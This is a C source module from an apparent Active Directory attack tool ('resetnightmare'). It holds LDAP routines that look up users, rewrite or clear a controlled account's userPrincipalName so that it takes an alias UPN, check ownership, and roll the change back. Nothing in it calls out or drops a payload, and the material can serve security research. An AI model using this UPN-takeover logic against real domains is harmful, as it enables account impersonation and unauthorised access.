/***********************************************************************************************************************
*                                                                                                                       *
*   MODULO:        directory.c                                                                                          *
*   DESCRIPCION:   Consultas LDAP, mutacion UPN transaccional y comprobacion de rollback.                              *
*                                                                                                                       *
***********************************************************************************************************************/

#include "resetnightmare.h"

/***********************************************************************************************************************
*                                           IMPLEMENTACION ACTIVE DIRECTORY                                            *
***********************************************************************************************************************/

static BOOL escapeLdapFilterValue( PCSTR pszValue, PCHAR pszOutput, SIZE_T cchOutput )
{
	static const CHAR szHex[] = "0123456789ABCDEF";
	SIZE_T			  iInput;
	SIZE_T			  iOutput = 0;

	if ( !pszValue || !pszOutput || cchOutput == 0 )
		return FALSE;

	for ( iInput = 0; pszValue[iInput] != 0; iInput++ )
	{
		UCHAR uchValue = ( UCHAR )pszValue[iInput];
		BOOL  bEscape  = uchValue == '*' || uchValue == '(' || uchValue == ')' || uchValue == '\\';

		if ( bEscape )
		{
			if ( iOutput + 3 >= cchOutput )
				return FALSE;
			pszOutput[iOutput++] = '\\';
			pszOutput[iOutput++] = szHex[uchValue >> 4];
			pszOutput[iOutput++] = szHex[uchValue & 0x0F];
		}
		else
		{
			if ( iOutput + 1 >= cchOutput )
				return FALSE;
			pszOutput[iOutput++] = ( CHAR )uchValue;
		}
	}

	pszOutput[iOutput] = 0;
	return TRUE;
}

BOOL baseDnToRealm( PCSTR pszBaseDn, PCHAR pszRealm, SIZE_T cchRealm )
{
	PCSTR  pszPart;
	PCSTR  pszEnd;
	PCSTR  pszNext;
	PCSTR  pszValue;
	PCSTR  pszValueEnd;
	SIZE_T cchValue;
	SIZE_T iOutput	   = 0;
	INT	   cComponents = 0;

	if ( !pszBaseDn || !pszRealm || cchRealm == 0 )
		return FALSE;

	pszPart = pszBaseDn;
	while ( *pszPart )
	{
		while ( *pszPart == ' ' )
			pszPart++;
		pszEnd = pszPart;
		while ( *pszEnd && *pszEnd != ',' )
		{
			if ( *pszEnd == '\\' && pszEnd[1] )
				pszEnd++;
			pszEnd++;
		}
		pszNext = *pszEnd ? pszEnd + 1 : pszEnd;

		if ( _strnicmp( pszPart, "DC=", 3 ) == 0 )
		{
			pszValue	= pszPart + 3;
			pszValueEnd = pszEnd;
			while ( pszValueEnd > pszValue && pszValueEnd[-1] == ' ' )
				pszValueEnd--;
			cchValue = ( SIZE_T )( pszValueEnd - pszValue );
			if ( cchValue == 0 || iOutput + cchValue + ( cComponents ? 1 : 0 ) >= cchRealm )
				return FALSE;
			if ( cComponents )
				pszRealm[iOutput++] = '.';
			memcpy( pszRealm + iOutput, pszValue, cchValue );
			iOutput += cchValue;
			cComponents++;
		}
		pszPart = pszNext;
	}

	if ( !cComponents || iOutput > MAXDWORD )
		return FALSE;
	pszRealm[iOutput] = 0;
	CharUpperBuffA( pszRealm, ( DWORD )iOutput );
	return TRUE;
}

BOOL modifyUserPrincipalName( LDAP *pLdap, PCSTR pszDn, PCSTR pszUpn )
{
	LDAPModA  stModification = { 0 };
	LDAPModA *ppMods[2]		 = { &stModification, NULL };
	PCHAR	  ppszValues[2]	 = { ( PCHAR )pszUpn, NULL };
	ULONG	  ulResult;

	if ( !pLdap || !pszDn )
		return FALSE;
	stModification.mod_op	  = pszUpn ? LDAP_MOD_REPLACE : LDAP_MOD_DELETE;
	stModification.mod_type	  = ( PCHAR )RN_USER_PRINCIPAL_NAME;
	stModification.mod_values = pszUpn ? ppszValues : NULL;
	ulResult				  = ldap_modify_sA( pLdap, ( PCHAR )pszDn, ppMods );
	return ulResult == LDAP_SUCCESS;
}

BOOL upnHasExpectedOwner( LDAP *pLdap, PCSTR pszBaseDn, PCSTR pszUpn, PCSTR pszExpectedDn )
{
	CHAR		 szEscaped[3076] = { 0 };
	CHAR		 szFilter[4096]	 = { 0 };
	LDAPMessage *pMessage		 = NULL;
	LDAPMessage *pEntry			 = NULL;
	PCHAR		 pszDn			 = NULL;
	ULONG		 ulResult;
	INT			 cchFilter;
	BOOL		 bMatches = FALSE;

	if ( !pLdap || !pszBaseDn || !pszUpn || !escapeLdapFilterValue( pszUpn, szEscaped, ARRAYSIZE( szEscaped ) ) )
		goto Cleanup;
	cchFilter = snprintf( szFilter, sizeof( szFilter ), "(userPrincipalName=%s)", szEscaped );
	if ( cchFilter < 0 || ( SIZE_T )cchFilter >= sizeof( szFilter ) )
		goto Cleanup;

	ulResult = ldap_search_ext_sA( pLdap, ( PCHAR )pszBaseDn, LDAP_SCOPE_SUBTREE, szFilter, NULL, 0, NULL, NULL, NULL,
								   2, &pMessage );
	if ( ulResult != LDAP_SUCCESS || !pMessage )
		goto Cleanup;
	if ( !pszExpectedDn )
	{
		bMatches = ldap_count_entries( pLdap, pMessage ) == 0;
		goto Cleanup;
	}
	if ( ldap_count_entries( pLdap, pMessage ) != 1 || !( pEntry = ldap_first_entry( pLdap, pMessage ) ) )
		goto Cleanup;
	pszDn	 = ldap_get_dnA( pLdap, pEntry );
	bMatches = pszDn && _stricmp( pszDn, pszExpectedDn ) == 0;

Cleanup:
	if ( pszDn )
		ldap_memfreeA( pszDn );
	if ( pMessage )
		ldap_msgfree( pMessage );
	return bMatches;
}

BOOL findUniqueUserBySamAccountName( LDAP *pLdap, PCSTR pszBaseDn, PCSTR pszAccount, PCHAR pszDn, SIZE_T cchDn,
									 PCHAR pszUpn, SIZE_T cchUpn )
{
	CHAR		 szEscaped[3076] = { 0 };
	CHAR		 szFilter[4096]	 = { 0 };
	PCHAR		 ppszAttrs[]	 = { ( PCHAR )RN_USER_PRINCIPAL_NAME, NULL };
	PCHAR		*ppszValues		 = NULL;
	PCHAR		 pszEntryDn		 = NULL;
	LDAPMessage *pMessage		 = NULL;
	LDAPMessage *pEntry;
	ULONG		 ulResult;
	INT			 cchResult;
	BOOL		 bSuccess = FALSE;

	if ( ( pszDn == NULL ) != ( cchDn == 0 ) || ( pszUpn == NULL ) != ( cchUpn == 0 ) )
		goto Cleanup;
	if ( pszDn )
		pszDn[0] = 0;
	if ( pszUpn )
		pszUpn[0] = 0;
	if ( !pLdap || !pszBaseDn || !pszAccount ||
		 !escapeLdapFilterValue( pszAccount, szEscaped, ARRAYSIZE( szEscaped ) ) )
		goto Cleanup;
	cchResult = snprintf( szFilter, sizeof( szFilter ), "(&(objectClass=user)(sAMAccountName=%s))", szEscaped );
	if ( cchResult < 0 || ( SIZE_T )cchResult >= sizeof( szFilter ) )
		goto Cleanup;
	ulResult = ldap_search_ext_sA( pLdap, ( PCHAR )pszBaseDn, LDAP_SCOPE_SUBTREE, szFilter, pszUpn ? ppszAttrs : NULL,
								   0, NULL, NULL, NULL, 2, &pMessage );
	if ( ulResult != LDAP_SUCCESS || !pMessage || ldap_count_entries( pLdap, pMessage ) != 1 ||
		 !( pEntry = ldap_first_entry( pLdap, pMessage ) ) )
		goto Cleanup;
	if ( pszDn )
	{
		pszEntryDn = ldap_get_dnA( pLdap, pEntry );
		if ( !stringCopy( pszDn, cchDn, pszEntryDn ) )
			goto Cleanup;
	}

	if ( pszUpn )
	{
		ppszValues = ldap_get_valuesA( pLdap, pEntry, ( PCHAR )RN_USER_PRINCIPAL_NAME );
		if ( ppszValues && ppszValues[0] )
		{
			if ( !stringCopy( pszUpn, cchUpn, ppszValues[0] ) )
				goto Cleanup;
		}
		else
		{
			pszUpn[0] = 0;
		}
	}
	bSuccess = TRUE;

Cleanup:
	if ( !bSuccess )
	{
		if ( pszDn )
			pszDn[0] = 0;
		if ( pszUpn )
			pszUpn[0] = 0;
	}
	if ( ppszValues )
		ldap_value_freeA( ppszValues );
	if ( pszEntryDn )
		ldap_memfreeA( pszEntryDn );
	if ( pMessage )
		ldap_msgfree( pMessage );
	return bSuccess;
}

BOOL hasRestoredUpnState( LDAP *pLdap, PCSTR pszBaseDn, PCSTR pszAlias, PCSTR pszControlledUpn, PCSTR pszControlledDn )
{
	return pLdap && pszBaseDn && pszAlias && pszControlledUpn && pszControlledDn &&
		   upnHasExpectedOwner( pLdap, pszBaseDn, pszAlias, NULL ) &&
		   ( !pszControlledUpn[0] || upnHasExpectedOwner( pLdap, pszBaseDn, pszControlledUpn, pszControlledDn ) );
}

BOOL restoreControlledUpn( LDAP *pLdap, PCSTR pszControlledDn, PCSTR pszControlledUpn, UPN_ROTATION_STATE *pState )
{
	if ( !pLdap || !pszControlledDn || !pszControlledUpn || !pState )
		return FALSE;
	if ( *pState == UPN_ROTATION_ORIGINAL )
		return TRUE;

	if ( *pState == UPN_ROTATION_CONTROLLED_OWNS_ALIAS )
	{
		if ( !modifyUserPrincipalName( pLdap, pszControlledDn, NULL ) )
			return FALSE;
		*pState = UPN_ROTATION_CONTROLLED_CLEARED;
	}
	if ( *pState == UPN_ROTATION_CONTROLLED_CLEARED )
	{
		if ( pszControlledUpn[0] && !modifyUserPrincipalName( pLdap, pszControlledDn, pszControlledUpn ) )
			return FALSE;
		*pState = UPN_ROTATION_ORIGINAL;
	}
	return *pState == UPN_ROTATION_ORIGINAL;
}
